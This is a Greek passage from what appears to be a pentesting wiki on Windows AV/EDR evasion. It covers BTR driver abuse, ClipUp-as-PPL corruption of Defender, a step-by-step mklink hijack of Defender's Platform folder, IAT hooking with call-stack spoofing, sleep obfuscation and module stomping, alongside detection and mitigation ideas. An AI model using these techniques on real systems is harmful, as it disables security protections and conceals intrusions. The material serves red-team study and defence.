`Start=0` δεν είναι αξιοποιήσιμο, επειδή το BTR εκτελεί file I/O από το `DriverEntry` πριν να είναι έτοιμα το storage stack και το link `SystemRoot`. Το `Start=1` μαζί με την ομάδα υψηλής προτεραιότητας `Boot Bus Extender` εκτελείται αντίθετα στη Phase 1: το NTFS είναι διαθέσιμο, αλλά πολλά system-start security drivers και user-mode EDR services δεν έχουν αρχικοποιηθεί. Boot-start filters όπως το `WdFilter` μπορεί να έχουν ήδη φορτωθεί, αλλά το BTR μπορεί να αφαιρέσει τα binaries τους ή τη διαμόρφωση των services πριν από την επόμενη εκκίνηση, καθώς και να διαγράψει τα εκτελέσιμα των services πριν τα εκκινήσει το SCM. Το ELAM δεν καλύπτει αυτό το κενό, επειδή το BTR εκτελείται μετά την αξιολόγηση boot-start και διαθέτει έγκυρη υπογραφή Microsoft.<sup>[[36]](#references)</sup>

Πολλαπλές ενέργειες εκτελούνται σε μία συναλλαγή. Το PoC προτάσσει την Action 1 για το hard-coded `\SystemRoot\Temp\BootClean.log`: το BTR δημιουργεί αυτό το log, έπειτα εκτελεί το δικό του αίτημα διαγραφής και το αφαιρεί πριν από την εκφόρτωση. Αυτό μειώνει τα αποδεικτικά στοιχεία, ενώ η τοποθέτηση feedback στο `<random>.sys:<random>.dat` επιτρέπει την ταυτόχρονη αφαίρεση του driver και των δύο streams.<sup>[[36]](#references)[[37]](#references)</sup>

### Συσχετίσεις ανίχνευσης υψηλής πιστότητας

Οι κανόνες που βασίζονται μόνο στην υπογραφή και η Microsoft vulnerable-driver blocklist δεν αντιμετωπίζουν την κατάχρηση της προβλεπόμενης λειτουργικότητας του BTR. Προτιμήστε τις παρακάτω συμπεριφορικές συσχετίσεις, διακρίνοντας παράλληλα τη νόμιμη προέλευση από το Defender από έναν αυθαίρετο launcher.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Η δημιουργία του `.sys:changelist` είναι καθολικό χαρακτηριστικό του staging του BTR. Ένα `.dat` ADS συνδεδεμένο στο ίδιο `.sys` είναι ιδιαίτερα ύποπτο, επειδή το νόμιμο Defender τοποθετεί συνήθως το feedback κάτω από το `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 χωρίς System 7045:** συσχετίστε την άμεση δημιουργία του `HKLM\SYSTEM\CurrentControlSet\Services\<random>`, που περιέχει `Args=...:changelist` και `Group=Boot Bus Extender`, με την απουσία αντίστοιχου SCM installation event.
- **Sysmon 6 -> 23:** συσχετίστε τη φόρτωση γνωστού BTR driver από προέλευση που δεν σχετίζεται με το Defender με την επακόλουθη διαγραφή αρχείων που αποδίδεται στο `System`/PID 4, ιδίως για security binaries.
- **Sysmon 11 -> 23:** ειδοποιήστε για τη γρήγορη δημιουργία και διαγραφή του `\SystemRoot\Temp\BootClean.log` από το `System`/PID 4.
- Περιορίστε και ελέγχετε την εκχώρηση/ενεργοποίηση του `SeLoadDriverPrivilege`. Μια υπογραφή Microsoft από μόνη της δεν αρκεί ως ένδειξη εμπιστοσύνης, όταν ένας driver εργαλείου ασφαλείας γίνεται staging από `cmd.exe`, PowerShell ή άγνωστη διεργασία.

## Κατάχρηση του Protected Process Light (PPL) για αλλοίωση AV/EDR με LOLBINs

Το Protected Process Light (PPL) επιβάλλει μια ιεραρχία signer/level, ώστε μόνο protected processes ίδιου ή υψηλότερου επιπέδου να μπορούν να αλλοιώνουν το ένα το άλλο. Από επιθετική σκοπιά, αν μπορείτε να εκκινήσετε νόμιμα ένα PPL-enabled binary και να ελέγξετε τα ορίσματά του, μπορείτε να μετατρέψετε μια αβλαβή λειτουργικότητα (π.χ. logging) σε ένα περιορισμένο write primitive, υποστηριζόμενο από PPL, για protected directories που χρησιμοποιούνται από AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Τι απαιτείται για να εκτελεστεί μια διεργασία ως PPL
- Το target EXE (και τυχόν φορτωμένα DLLs) πρέπει να είναι υπογεγραμμένα με PPL-capable EKU.
- Η διεργασία πρέπει να δημιουργηθεί με `CreateProcess` χρησιμοποιώντας τις flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Πρέπει να ζητηθεί συμβατό protection level που να αντιστοιχεί στον signer του binary (π.χ. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για anti-malware signers, `PROTECTION_LEVEL_WINDOWS` για Windows signers). Λανθασμένα levels θα προκαλέσουν αποτυχία κατά τη δημιουργία.

Δείτε επίσης μια ευρύτερη εισαγωγή στα PP/PPL και στην προστασία LSASS εδώ:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Εργαλεία launcher
- Βοηθητικό εργαλείο ανοικτού κώδικα: CreateProcessAsPPL (επιλέγει protection level και προωθεί τα ορίσματα στο target EXE):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Μοτίβο χρήσης:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Το υπογεγραμμένο δυαδικό αρχείο συστήματος `C:\Windows\System32\ClipUp.exe` εκκινεί τον εαυτό του και δέχεται παράμετρο για την εγγραφή ενός αρχείου καταγραφής σε διαδρομή που ορίζει ο καλών.
- Όταν εκκινείται ως διεργασία PPL, η εγγραφή αρχείου γίνεται με υποστήριξη PPL.
- Το ClipUp δεν μπορεί να αναλύσει διαδρομές που περιέχουν κενά· χρησιμοποιήστε σύντομες διαδρομές 8.3 για να δείξετε σε τοποθεσίες που κανονικά προστατεύονται.

Βοηθητικά εργαλεία για σύντομες διαδρομές 8.3
- Εμφάνιση σύντομων ονομάτων: `dir /x` σε κάθε γονικό κατάλογο.
- Εύρεση σύντομης διαδρομής στο cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Αλυσίδα κατάχρησης (αφηρημένη)
1) Εκκινήστε το PPL-capable LOLBIN (ClipUp) με `CREATE_PROTECTED_PROCESS`, χρησιμοποιώντας έναν launcher (π.χ., CreateProcessAsPPL).
2) Δώστε την παράμετρο διαδρομής καταγραφής του ClipUp για να επιβάλετε τη δημιουργία αρχείου σε προστατευμένο κατάλογο AV (π.χ., Defender Platform). Χρησιμοποιήστε σύντομα ονόματα 8.3, αν χρειάζεται.
3) Αν το AV έχει συνήθως ανοιχτό/κλειδωμένο το δυαδικό αρχείο-στόχο όταν εκτελείται (π.χ., MsMpEng.exe), προγραμματίστε την εγγραφή κατά την εκκίνηση, πριν ξεκινήσει το AV, εγκαθιστώντας μια υπηρεσία αυτόματης εκκίνησης που εκτελείται αξιόπιστα νωρίτερα. Επαληθεύστε τη σειρά εκκίνησης με το Process Monitor (καταγραφή εκκίνησης).
4) Μετά την επανεκκίνηση, η εγγραφή με υποστήριξη PPL γίνεται πριν το AV κλειδώσει τα δυαδικά αρχεία του, καταστρέφοντας το αρχείο-στόχο και εμποδίζοντας την εκκίνηση.

Παράδειγμα κλήσης (οι διαδρομές έχουν αφαιρεθεί/συντομευτεί για λόγους ασφάλειας):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Σημειώσεις και περιορισμοί
- Δεν μπορείτε να ελέγξετε τα περιεχόμενα που γράφει το ClipUp, μόνο τη θέση τους· η primitive είναι κατάλληλη για corruption και όχι για ακριβή εισαγωγή περιεχομένου.
- Απαιτούνται τοπικά δικαιώματα admin/SYSTEM για την εγκατάσταση/εκκίνηση μιας υπηρεσίας και ένα παράθυρο επανεκκίνησης.
- Ο χρονισμός είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά την εκκίνηση αποφεύγει τα file locks.

Εντοπισμοί
- Δημιουργία διεργασίας `ClipUp.exe` με ασυνήθιστα ορίσματα, ειδικά όταν έχει ως γονική διεργασία μη τυπικούς launchers, κοντά στην εκκίνηση.
- Νέες υπηρεσίες ρυθμισμένες να εκκινούν αυτόματα ύποπτα binaries και να ξεκινούν σταθερά πριν από το Defender/AV. Ερευνήστε τη δημιουργία/τροποποίηση υπηρεσιών πριν από αποτυχίες εκκίνησης του Defender.
- Παρακολούθηση ακεραιότητας αρχείων για binaries/καταλόγους Platform του Defender· μη αναμενόμενες δημιουργίες/τροποποιήσεις αρχείων από διεργασίες με protected-process flags.
- Τηλεμετρία ETW/EDR: αναζητήστε διεργασίες που δημιουργήθηκαν με `CREATE_PROTECTED_PROCESS` και ανώμαλη χρήση επιπέδων PPL από binaries που δεν σχετίζονται με AV.

Μετριασμοί
- WDAC/Code Integrity: περιορίστε ποια υπογεγραμμένα binaries μπορούν να εκτελούνται ως PPL και από ποιες γονικές διεργασίες· αποκλείστε την κλήση του ClipUp εκτός νόμιμων περιπτώσεων.
- Υγιεινή υπηρεσιών: περιορίστε τη δημιουργία/τροποποίηση υπηρεσιών αυτόματης εκκίνησης και παρακολουθήστε τη χειραγώγηση της σειράς εκκίνησης.
- Βεβαιωθείτε ότι είναι ενεργοποιημένες οι προστασίες Defender tamper και early-launch· διερευνήστε σφάλματα εκκίνησης που υποδεικνύουν corruption binary.
- Εξετάστε το ενδεχόμενο απενεργοποίησης της δημιουργίας σύντομων ονομάτων 8.3 σε τόμους που φιλοξενούν εργαλεία ασφάλειας, εφόσον είναι συμβατό με το περιβάλλον σας (δοκιμάστε διεξοδικά).

## Παραποίηση του Microsoft Defender μέσω Symlink Hijack του φακέλου Platform Version

Το Windows Defender επιλέγει την πλατφόρμα από την οποία εκτελείται, απαριθμώντας τους υποφακέλους κάτω από:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Επιλέγει τον υποφάκελο με τη μεγαλύτερη λεξικογραφικά συμβολοσειρά έκδοσης (π.χ., `4.18.25070.5-0`) και στη συνέχεια εκκινεί από εκεί τις διεργασίες υπηρεσίας του Defender (ενημερώνοντας αντίστοιχα τις διαδρομές υπηρεσίας/μητρώου). Αυτή η επιλογή εμπιστεύεται τις εγγραφές καταλόγου, συμπεριλαμβανομένων των directory reparse points (symlinks). Ένας administrator μπορεί να το αξιοποιήσει για να ανακατευθύνει το Defender σε διαδρομή εγγράψιμη από attacker και να επιτύχει DLL sideloading ή διακοπή λειτουργίας της υπηρεσίας.<sup>[[21]](#references)[[22]](#references)</sup>

Προϋποθέσεις
- Τοπικός Administrator (απαιτείται για τη δημιουργία καταλόγων/symlinks κάτω από τον φάκελο Platform)
- Δυνατότητα επανεκκίνησης ή ενεργοποίησης νέας επιλογής πλατφόρμας Defender (επανεκκίνηση της υπηρεσίας κατά την εκκίνηση)
- Απαιτούνται μόνο ενσωματωμένα εργαλεία (mklink)

Γιατί λειτουργεί
- Το Defender αποκλείει τις εγγραφές στους δικούς του φακέλους, αλλά η επιλογή πλατφόρμας εμπιστεύεται τις εγγραφές καταλόγου και επιλέγει την έκδοση με τη μεγαλύτερη λεξικογραφικά τιμή χωρίς να επαληθεύει ότι ο προορισμός αντιστοιχεί σε προστατευμένη/έμπιστη διαδρομή.

Βήμα προς βήμα (παράδειγμα)
1) Προετοιμάστε ένα εγγράψιμο αντίγραφο του τρέχοντος φακέλου platform, π.χ. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Δημιουργήστε μέσα στο Platform έναν συμβολικό σύνδεσμο καταλόγου με υψηλότερη έκδοση που να δείχνει στον φάκελό σας:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Επιλογή trigger (συνιστάται επανεκκίνηση):
```cmd
shutdown /r /t 0
```
4) Επαληθεύστε ότι το MsMpEng.exe (WinDefend) εκτελείται από την ανακατευθυνόμενη διαδρομή:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Θα πρέπει να παρατηρήσετε τη νέα διαδρομή της διεργασίας κάτω από το `C:\TMP\AV\` και τη διαμόρφωση της υπηρεσίας/το registry να αντικατοπτρίζουν αυτήν την τοποθεσία.

Επιλογές post-exploitation
- DLL sideloading/code execution: Τοποθετήστε/αντικαταστήστε DLL που φορτώνει το Defender από τον κατάλογο της εφαρμογής του, για να εκτελέσετε κώδικα στις διεργασίες του Defender. Δείτε την παραπάνω ενότητα: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Τερματισμός υπηρεσίας/άρνηση υπηρεσίας: Αφαιρέστε το version-symlink, ώστε στην επόμενη εκκίνηση η διαμορφωμένη διαδρομή να μην επιλύεται και το Defender να αποτυγχάνει να ξεκινήσει:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Σημειώστε ότι αυτή η τεχνική δεν παρέχει από μόνη της κλιμάκωση προνομίων· απαιτεί δικαιώματα διαχειριστή.

## API/IAT Hooking + Call-Stack Spoofing με PIC (Crystal Kit-style)

Οι ομάδες Red Team μπορούν να μεταφέρουν την αποφυγή εντοπισμού κατά τον χρόνο εκτέλεσης από το implant του C2 απευθείας στην ίδια τη μονάδα-στόχο, κάνοντας hooking στον Import Address Table (IAT) της και δρομολογώντας επιλεγμένα API μέσω κώδικα ανεξάρτητου από τη θέση (PIC) που ελέγχει ο επιτιθέμενος. Αυτό γενικεύει την αποφυγή εντοπισμού πέρα από το μικρό σύνολο API που διαθέτουν πολλά kits (π.χ. CreateProcessA) και επεκτείνει τις ίδιες προστασίες σε BOFs και DLL post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Προσέγγιση υψηλού επιπέδου
- Τοποθετήστε ένα blob PIC δίπλα στη μονάδα-στόχο χρησιμοποιώντας έναν reflective loader (προσαρτημένο στην αρχή ή ως συνοδευτικό αρχείο). Το PIC πρέπει να είναι αυτοτελές και ανεξάρτητο από τη θέση.
- Κατά τη φόρτωση του DLL που φιλοξενεί τον κώδικα, διατρέξτε το IMAGE_IMPORT_DESCRIPTOR του και τροποποιήστε τις εγγραφές IAT για τις εισαγωγές-στόχους (π.χ. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ώστε να δείχνουν σε λεπτούς wrappers PIC.
- Κάθε wrapper PIC εκτελεί τεχνικές αποφυγής εντοπισμού πριν από την κλήση του πραγματικού API μέσω tail-call. Συνήθεις τεχνικές αποφυγής εντοπισμού περιλαμβάνουν:
  - Απόκρυψη/επαναφορά μνήμης γύρω από την κλήση (π.χ. κρυπτογράφηση περιοχών beacon, RWX→RX, αλλαγή ονομάτων/δικαιωμάτων σελίδων) και κατόπιν επαναφορά.
  - Call-Stack Spoofing: κατασκευή ενός αβλαβούς stack και μετάβαση στο API-στόχο, ώστε η ανάλυση του call stack να καταλήγει στα αναμενόμενα frames.<sup>[[9]](#references)</sup>
- Για συμβατότητα, εξαγάγετε ένα interface ώστε ένα script Aggressor (ή αντίστοιχο) να μπορεί να δηλώνει ποια API θα γίνονται hook για το Beacon, τα BOFs και τα DLL post-exploitation.

Γιατί να χρησιμοποιήσετε IAT hooking εδώ
- Λειτουργεί με κάθε κώδικα που χρησιμοποιεί το API στο οποίο γίνεται hooking, χωρίς να τροποποιείτε τον κώδικα του εργαλείου ή να βασίζεστε στο Beacon για την προώθηση συγκεκριμένων API.
- Καλύπτει τα DLL post-exploitation: το hooking στα LoadLibrary* σάς επιτρέπει να παρεμβάλλεστε στη φόρτωση μονάδων (π.χ. System.Management.Automation.dll, clr.dll) και να εφαρμόζετε την ίδια απόκρυψη/αποφυγή εντοπισμού stack στις κλήσεις API τους.
- Επαναφέρει την αξιόπιστη χρήση εντολών post-exploitation που δημιουργούν διεργασίες, απέναντι σε ανιχνεύσεις βασισμένες στο call stack, μέσω wrappers για τα CreateProcessA/W.

Σχηματικό παράδειγμα ελάχιστου IAT hook (ψευδοκώδικας x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Σημειώσεις
- Εφάρμοσε το patch μετά τις relocations/ASLR και πριν από την πρώτη χρήση του import. Reflective loaders όπως οι TitanLdr/AceLdr δείχνουν πώς γίνεται hooking κατά τη διάρκεια του DllMain του φορτωμένου module.
- Κράτησε τα wrappers μικρά και ασφαλή για PIC· επίλυσε το πραγματικό API μέσω της αρχικής τιμής IAT που αποθήκευσες πριν από το patching ή μέσω του LdrGetProcedureAddress.
- Χρησιμοποίησε μεταβάσεις RW → RX για PIC και απόφυγε να αφήνεις σελίδες με δικαιώματα εγγραφής και εκτέλεσης.

Stub πλαστογράφησης call stack
- Τα PIC stubs τύπου Draugr δημιουργούν μια ψεύτικη αλυσίδα κλήσεων (με διευθύνσεις επιστροφής μέσα σε benign modules) και έπειτα μεταβαίνουν στο πραγματικό API.
- Αυτό παρακάμπτει detections που αναμένουν canonical stacks από Beacon/BOFs προς ευαίσθητα APIs.
- Συνδύασέ το με τεχνικές stack cutting/stack stitching, ώστε να καταλήγεις μέσα στα αναμενόμενα frames πριν από το prologue του API.

Επιχειρησιακή ενσωμάτωση
- Πρόσθεσε τον reflective loader στην αρχή των post-ex DLLs, ώστε τα PIC και hooks να αρχικοποιούνται αυτόματα κατά τη φόρτωση του DLL.
- Χρησιμοποίησε ένα Aggressor script για να καταχωρίζεις τα APIs-στόχους, ώστε τα Beacon και BOFs να επωφελούνται διαφανώς από την ίδια διαδρομή evasion χωρίς αλλαγές στον κώδικα.

Σκέψεις για Detection/DFIR
- Ακεραιότητα IAT: entries που επιλύονται σε διευθύνσεις εκτός image (heap/anon)· περιοδική επαλήθευση των import pointers.
- Ανωμαλίες stack: διευθύνσεις επιστροφής που δεν ανήκουν σε φορτωμένα images· απότομες μεταβάσεις σε PIC εκτός image· ασυνεπής καταγωγή RtlUserThreadStart.
- Τηλεμετρία loader: εγγραφές στην IAT από την ίδια διεργασία, πρώιμη δραστηριότητα DllMain που τροποποιεί import thunks, απρόσμενες περιοχές RX που δημιουργούνται κατά τη φόρτωση.
- Αποφυγή image-load: αν γίνεται hooking του LoadLibrary*, παρακολούθησε ύποπτες φορτώσεις automation/clr assemblies που συσχετίζονται με συμβάντα masking μνήμης.

Σχετικά δομικά στοιχεία και παραδείγματα
- Reflective loaders που κάνουν IAT patching κατά τη φόρτωση (π.χ. TitanLdr, AceLdr)
- Hooks masking μνήμης (π.χ. simplehook) και PIC stack-cutting (stackcutting)
- PIC stubs πλαστογράφησης call stack (π.χ. Draugr)


## IAT Hooking κατά τη φόρτωση + Sleep Obfuscation (Crystal Palace/PICO)

### IAT hooks κατά τη φόρτωση μέσω ενός resident PICO

Αν ελέγχεις έναν reflective loader, μπορείς να κάνεις hooking στα imports **κατά τη διάρκεια** του `ProcessImports()`, αντικαθιστώντας τον δείκτη `GetProcAddress` του loader με έναν custom resolver που ελέγχει πρώτα τα hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Δημιούργησε ένα **resident PICO** (persistent PIC object) που παραμένει ενεργό αφού το transient loader PIC αποδεσμεύσει τη μνήμη του.
- Εξήγαγε μια συνάρτηση `setup_hooks()` που αντικαθιστά τον import resolver του loader (π.χ. `funcs.GetProcAddress = _GetProcAddress`).
- Στο `_GetProcAddress`, παράλειψε τα ordinal imports και χρησιμοποίησε αναζήτηση hook βάσει hash, όπως `__resolve_hook(ror13hash(name))`. Αν υπάρχει hook, επέστρεψέ το· διαφορετικά, κάλεσε τον πραγματικό `GetProcAddress`.
- Κατά την linking, καταχώρισε τους στόχους των hooks με entries Crystal Palace `addhook "MODULE$Func" "hook"`. Το hook παραμένει έγκυρο επειδή βρίσκεται μέσα στο resident PICO.

Έτσι γίνεται **ανακατεύθυνση IAT κατά τη φόρτωση**, χωρίς patching στο code section του φορτωμένου DLL μετά τη φόρτωση.

### Επιβολή imports που επιδέχονται hooking όταν ο στόχος χρησιμοποιεί PEB-walking

Τα hooks κατά τη φόρτωση ενεργοποιούνται μόνο αν η συνάρτηση υπάρχει πράγματι στην IAT του στόχου. Αν ένα module επιλύει APIs μέσω PEB-walk + hash (χωρίς import entry), πρόσθεσε ένα κανονικό import ώστε η διαδρομή `ProcessImports()` του loader να το εντοπίσει:

- Αντικατάστησε την επίλυση hashed exports (π.χ. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) με άμεση αναφορά, όπως `&WaitForSingleObject`.
- Ο compiler δημιουργεί ένα IAT entry, επιτρέποντας την αναχαίτιση όταν ο reflective loader επιλύει τα imports.

### Obfuscation ύπνου/αδράνειας τύπου Ekko χωρίς patching του `Sleep()`

Αντί να κάνεις patch το `Sleep`, κάνε hooking στα **πραγματικά primitives αναμονής/IPC** που χρησιμοποιεί το implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Για μεγάλες αναμονές, τύλιξε την κλήση σε μια αλυσίδα obfuscation τύπου Ekko που κρυπτογραφεί το image στη μνήμη κατά την αδράνεια:<sup>[[31]](#references)[[27]](#references)</sup>

- Χρησιμοποίησε το `CreateTimerQueueTimer` για να προγραμματίσεις μια ακολουθία callbacks που καλούν το `NtContinue` με κατασκευασμένα `CONTEXT` frames.
- Τυπική αλυσίδα (x64): όρισε το image ως `PAGE_READWRITE` → κρυπτογράφησέ το με RC4 μέσω του `advapi32!SystemFunction032` σε ολόκληρο το mapped image → εκτέλεσε την blocking αναμονή → αποκρυπτογράφησέ το με RC4 → **επανάφερε τα δικαιώματα ανά section** διατρέχοντας τα PE sections → δήλωσε ολοκλήρωση.
- Το `RtlCaptureContext` παρέχει ένα πρότυπο `CONTEXT`· κλωνοποίησέ το σε πολλαπλά frames και όρισε registers (`Rip/Rcx/Rdx/R8/R9`) ώστε να εκτελείται κάθε βήμα.

Επιχειρησιακή λεπτομέρεια: επέστρεψε “success” για μεγάλες αναμονές (π.χ. `WAIT_OBJECT_0`), ώστε ο caller να συνεχίσει ενώ το image είναι masked. Αυτό το μοτίβο αποκρύπτει το module από scanners κατά τα παράθυρα αδράνειας και αποφεύγει το κλασικό signature του “patched `Sleep()`”.

Ιδέες για Detection (βάσει telemetry)
- Συστάδες callbacks `CreateTimerQueueTimer` που δείχνουν στο `NtContinue`.
- Χρήση του `advapi32!SystemFunction032` σε μεγάλα, συνεχόμενα buffers μεγέθους image.
- `VirtualProtect` σε μεγάλο εύρος, ακολουθούμενο από προσαρμοσμένη επαναφορά δικαιωμάτων ανά section.

### Runtime καταχώριση CFG για gadgets sleep-obfuscation

Σε στόχους με ενεργοποιημένο CFG, το πρώτο indirect jump σε gadget ενδιάμεσης συνάρτησης, όπως `jmp [rbx]` ή `jmp rdi`, συνήθως θα προκαλέσει crash στη διεργασία με `STATUS_STACK_BUFFER_OVERRUN`, επειδή το gadget δεν υπάρχει στα metadata CFG του module. Για να παραμένουν ενεργές οι αλυσίδες τύπου Ekko/Kraken μέσα σε hardened διεργασίες:<sup>[[30]](#references)</sup>

- Καταχώρισε κάθε indirect destination που χρησιμοποιεί η αλυσίδα με `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` και entries `CFG_CALL_TARGET_VALID`.
- Για διευθύνσεις μέσα σε φορτωμένα images (`ntdll`, `kernel32`, `advapi32`), το `MEMORY_RANGE_ENTRY` πρέπει να ξεκινά από το **image base** και να καλύπτει **ολόκληρο το μέγεθος του image**.
- Για manually mapped/PIC/stomped περιοχές, χρησιμοποίησε το **allocation base** και το μέγεθος της allocation.
- Σήμανε όχι μόνο το dispatch gadget, αλλά και exports στα οποία γίνεται έμμεση πρόσβαση (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), καθώς και κάθε εκτελέσιμο section που ελέγχεται από τον attacker και θα γίνει indirect target.

Έτσι οι αλυσίδες ύπνου τύπου ROP/JOP μετατρέπονται από «λειτουργούν μόνο σε διεργασίες χωρίς CFG» σε επαναχρησιμοποιήσιμο primitive για τα `explorer.exe`, browsers, `svchost.exe` και άλλα endpoints που έχουν μεταγλωττιστεί με `/guard:cf`.

### CET-safe πλαστογράφηση stack για threads σε αναμονή

Η πλήρης αντικατάσταση του `CONTEXT` είναι θορυβώδης και μπορεί να αποτύχει σε συστήματα CET Shadow Stack, επειδή ένα πλαστογραφημένο `Rip` πρέπει να συμφωνεί με το hardware shadow stack. Ένα ασφαλέστερο μοτίβο sleep-masking είναι το εξής:<sup>[[30]](#references)</sup>

- Επίλεξε ένα άλλο thread στην ίδια διεργασία και διάβασε τα όρια stack του `NT_TIB` / TEB (`StackBase`, `StackLimit`) μέσω του `NtQueryInformationThread`.
- Δημιούργησε αντίγραφο ασφαλείας του πραγματικού TEB/TIB του τρέχοντος thread.
- Κατέγραψε το πραγματικό context του thread που βρίσκεται σε αναμονή με το `GetThreadContext`.
- Αντέγραψε **μόνο** το πραγματικό `Rip` στο spoof context, αφήνοντας ανέπαφα το spoofed `Rsp`/stack state.
- Κατά τη διάρκεια του παραθύρου αναμονής, αντέγραψε το `NT_TIB` του spoof thread στο τρέχον TEB, ώστε οι stack walkers να κάνουν unwind μέσα σε ένα έγκυρο εύρος stack.
- Μετά την αναμονή, επανάφερε το αρχικό TIB και το thread context.

Έτσι διατηρείται ένας `Rip` συμβατός με CET, ενώ παραπλανώνται οι EDR stack walkers που εμπιστεύονται τα metadata stack του TEB για να επικυρώνουν τα unwinds.

### Εναλλακτική με APC: Kraken Mask

Αν το dispatch μέσω timer-queue έχει πολύ αναγνωρίσιμο signature, η ίδια ακολουθία sleep-encrypt-spoof-restore μπορεί να εκτελεστεί από ένα suspended helper thread με queued APCs:<sup>[[27]](#references)</sup>

- Δημιούργησε ένα helper thread με entrypoint το `NtTestAlert`.
- Τοποθέτησε σε ουρά τα προετοιμασμένα `CONTEXT` frames/APCs με το `NtQueueApcThread` και εκτέλεσέ τα με το `NtAlertResumeThread`.
- Αποθήκευσε την κατάσταση της αλυσίδας στο heap αντί για το stack του helper, ώστε να αποφύγεις την εξάντληση του προεπιλεγμένου stack των 64 KB του thread.
- Χρησιμοποίησε το `NtSignalAndWaitForSingleObject` για να σηματοδοτήσεις ατομικά το start event και να μπλοκάρεις.
- Ανέστειλε το main thread πριν από την επαναφορά του TIB/context (`NtSuspendThread` → restore → `NtResumeThread`), ώστε να μειωθεί το παράθυρο race στο οποίο ένας scanner θα μπορούσε να εντοπίσει ένα μερικώς επαναφερμένο stack.

Αυτό αντικαθιστά το signature `CreateTimerQueueTimer` + `NtContinue` με signature helper-thread/APC, διατηρώντας τους ίδιους στόχους RC4 masking και stack-spoofing.

Πρόσθετες ιδέες για Detection
- `NtSetInformationVirtualMemory` με `VmCfgCallTargetInformation` λίγο πριν από sleeps, waits ή APC dispatch.
- `GetThreadContext`/`SetThreadContext` σε συνδυασμό με `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ή `ConnectNamedPipe`.
- `NtQueryInformationThread` και στη συνέχεια άμεσες εγγραφές στα όρια stack του TEB/TIB του τρέχοντος thread.
- Αλυσίδες `NtQueueApcThread`/`NtAlertResumeThread` που καταλήγουν έμμεσα στα `SystemFunction032`, `VirtualProtect` ή σε helpers επαναφοράς δικαιωμάτων section.
- Επαναλαμβανόμενη χρήση σύντομων gadget signatures, όπως `FF 23` (`jmp [rbx]`) ή `FF E7` (`jmp rdi`), ως dispatch pivots μέσα σε υπογεγραμμένα modules.


## Ακριβές Module Stomping

Το Module stomping εκτελεί payloads από το **`.text` section ενός DLL που είναι ήδη mapped μέσα στη διεργασία-στόχο**, αντί να δεσμεύει εμφανή ιδιωτική εκτελέσιμη μνήμη ή να φορτώνει ένα νέο sacrificial DLL. Ο στόχος overwrite πρέπει να είναι ένα **φορτωμένο image που υποστηρίζεται από αρχείο στον δίσκο**, με αρκετό χώρο κώδικα για το payload χωρίς να αλλοιωθούν διαδρομές κώδικα που εξακολουθεί να χρειάζεται η διεργασία.<sup>[[1]](#references)[[2]](#references)</sup>

### Αξιόπιστη επιλογή στόχου

Το αφελές stomping σε συνηθισμένα modules, όπως τα `uxtheme.dll` ή `comctl32.dll`, είναι εύθραυστο: το DLL μπορεί να μην έχει φορτωθεί στην απομακρυσμένη διεργασία, ενώ μια περιοχή κώδικα με ανεπαρκές μέγεθος μπορεί να προκαλέσει crash στη διεργασία. Μια πιο αξιόπιστη ροή εργασίας είναι:

1. Κατέγραψε τα modules της διεργασίας-στόχου και κράτησε μια λίστα include που περιέχει **μόνο ονόματα** των ήδη φορτωμένων DLL.
2. Δημιούργησε πρώτα το payload και κατέγραψε το **ακριβές μέγεθός του σε bytes**.
3. Σάρωσε υποψήφια DLL στον δίσκο και σύγκρινε το **`.text` `Misc_VirtualSize`** του PE section με το μέγεθος του payload. Αυτό έχει μεγαλύτερη σημασία από το μέγεθος του αρχείου, επειδή αποτυπώνει το μέγεθος του εκτελέσιμου section **όταν γίνεται mapping στη μνήμη**.
